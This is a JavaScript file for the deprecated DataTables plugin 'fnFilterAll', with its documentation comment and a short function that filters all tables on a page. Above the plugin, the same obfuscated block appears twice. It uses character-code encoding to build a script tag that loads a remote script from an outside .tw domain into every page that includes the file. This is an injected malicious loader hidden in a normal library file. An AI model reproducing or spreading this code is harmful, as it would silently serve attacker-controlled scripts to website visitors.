Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * Apply the same filter to all DataTable instances on a particular page. The
 * function call exactly matches that used by `fnFilter()` so regular expression
 * and individual column sorting can be used.
 *
 * DataTables 1.10+ provides this ability through its new API, which is able to
 * to control multiple tables at a time.
 * `$('.dataTable').DataTable().search( ... )` for example will apply the same
 * filter to all tables on the page. The new API should be used in preference
 * to this older method if at all possible.
 *
 *  @name fnFilterAll
 *  @summary Apply a common filter to all DataTables on a page
 *  @author [Kristoffer Karlström](http://www.kmmtiming.se/)
 *  @deprecated
 *
 *  @param {string} sInput Filtering input
 *  @param {integer} [iColumn=null] Column to apply the filter to
 *  @param {boolean} [bRegex] Regular expression flag
 *  @param {boolean} [bSmart] Smart filtering flag
 *
 *  @example
 *    $(document).ready(function() {
 *      var table = $(".dataTable").dataTable();
 *       
 *      $("#search").keyup( function () {
 *        // Filter on the column (the index) of this element
 *        table.fnFilterAll(this.value);
 *      } );
 *    });
 */

jQuery.fn.dataTableExt.oApi.fnFilterAll = function(oSettings, sInput, iColumn, bRegex, bSmart) {
    var settings = $.fn.dataTableSettings;

    for ( var i=0 ; i<settings.length ; i++ ) {
      settings[i].oInstance.fnFilter( sInput, iColumn, bRegex, bSmart);
    }
};
